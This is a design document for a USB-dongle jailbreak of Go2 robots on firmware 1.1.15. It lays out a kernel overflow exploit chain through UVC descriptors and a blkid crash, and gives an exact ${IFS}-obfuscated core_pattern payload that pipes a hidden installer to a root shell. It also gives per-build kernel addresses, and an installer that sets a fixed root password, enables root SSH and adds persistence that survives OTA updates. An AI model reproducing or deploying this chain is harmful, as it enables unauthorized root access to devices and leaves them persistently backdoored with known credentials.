# UnLeash 2.0 — USB Dongle Integration Design

## Overview

Single-plug jailbreak: flash a Pico2, plug it into any Go2 on fw 1.1.15,
get persistent root SSH. No laptop, no app, no network needed at exploit time.

## Exploit Chain

```
Pico2 plugs in
  → USB enumerates 30 interfaces (UVC + Mass Storage)
  → UVC descriptor overflow writes core_name_size + core_pattern in kernel .data
  → Mass Storage appears as /dev/sdX
  → udev rule 60-persistent-storage.rules runs blkid on /dev/sdX
  → blkid crashes on OracleCFS (SIGSEGV in __memcpy_generic)
  → kernel executes core_pattern pipe handler as root
  → bootstrap extracts installer from mass storage, pipes to sh
  → installer enables SSH, installs persistence, marks success
```

## Core Pattern Bootstrap

The overflow writes this string to `core_pattern` (kernel .data):

```
|/bin/sh -c dd${IFS}if=$(ls${IFS}/dev/sd?|tail${IFS}-1)${IFS}bs=512${IFS}skip=2048${IFS}count=128|sh
```

**100 bytes** (fits in the 127-byte core_pattern field).

How it works:
- Kernel splits on whitespace: `/bin/sh`, `-c`, `dd${IFS}if=...` (one token, no spaces)
- sh evaluates `${IFS}` as space (IFS default = space+tab+newline)
- `$(ls /dev/sd? | tail -1)` finds the Pico's block device (last /dev/sd?)
- `dd` reads 64KB from offset 1MB on the mass storage image
- Pipes the installer script to `sh`

Why `${IFS}`:
- Kernel's `argv_split()` splits core_pattern on whitespace before execve
- `sh -c` only gets ONE argument after `-c`
- `${IFS}` is literal text to the kernel, expanded to space by sh at runtime

## Mass Storage Image Layout (32 MB)

```
Offset          Size    Contents
─────────────────────────────────────────────────────
0x000000        1 MB    OracleCFS crash trigger
(sector 0)              De Bruijn pattern + magic header
                        Crashes blkid (detonator)

0x100000        64 KB   Installer script (dongle_payload.sh)
(sector 2048)           Padded with nulls to 64KB
                        Extracted by bootstrap dd command

0x110000        ~31 MB  Reserved (future: additional payloads)
(sector 2176)           Could carry: SSH keys, custom scripts,
                        full UnLeash package tarballs
```

The bootstrap reads: `dd bs=512 skip=2048 count=128` = 64KB at offset 1MB.

## Pico2 Firmware Changes (for Will)

Two things need updating in the Pico2 source:

### 1. Core pattern payload string

Replace current:
```
|/bin/sh /root/go2_led.sh
```

With:
```
|/bin/sh -c dd${IFS}if=$(ls${IFS}/dev/sd?|tail${IFS}-1)${IFS}bs=512${IFS}skip=2048${IFS}count=128|sh
```

### 2. Mass storage disk image

Embed `dongle_payload.sh` at sector 2048 (offset 1MB) in the 32MB image.
Keep the OracleCFS header at sector 0 unchanged.

Build step (pseudocode):
```bash
# Start with existing 32MB image
cp oracle_cfs_image.bin msc_image.bin
# Embed installer at 1MB offset
dd if=dongle_payload.sh of=msc_image.bin bs=512 seek=2048 conv=notrunc
```

### 3. Target addresses (per kernel build)

Production fw 1.1.15 dogs (md5 `ec789487...`):
- core_name_size: `ffffffc011b82290` (Will's current values — no change)

App13's benchtop (md5 `76e5a22c...`):
- core_name_size: `ffffffc011b72290` (patch byte b8 → b7)

## What the Installer Does

1. **Enable SSH** — sets root password (`unleash`), permits root login, starts sshd
2. **Install ssh_guard.sh** — systemd service + cron + path watcher that
   keeps SSH alive across reboots and OTA updates
3. **Hook deb_update.sh** — OTA persistence: SSH re-enabled after firmware updates
4. **Disable apport** — prevents core_pattern from being overwritten on next boot
5. **Write marker** — `/root/.unleashed` with timestamp and credentials

Idempotent: re-plugging the dongle after installation is a no-op.

## Prod Dog Considerations

| Concern | Status |
|---|---|
| Slab precondition | Will's bench was 99.9% at rest — should work without spray |
| Apport race | UVC arm writes kernel memory directly; enumeration is synchronous |
| Addresses | Same kernel build → same addresses → no patch needed |
| USB device path | `ls /dev/sd? \| tail -1` handles any sdX assignment |
| Idempotent | Marker file prevents re-install on re-plug |
| Persistence | ssh_guard + deb_update hook survive reboots + OTA |

## UX

1. Flash `unleash-dongle.uf2` onto Pico2 (one-time, via BOOTSEL + drag-drop)
2. Plug Pico2 into any Go2 USB port
3. Wait ~5 seconds
4. SSH in: `ssh root@<dog-ip>` (password: `unleash`)
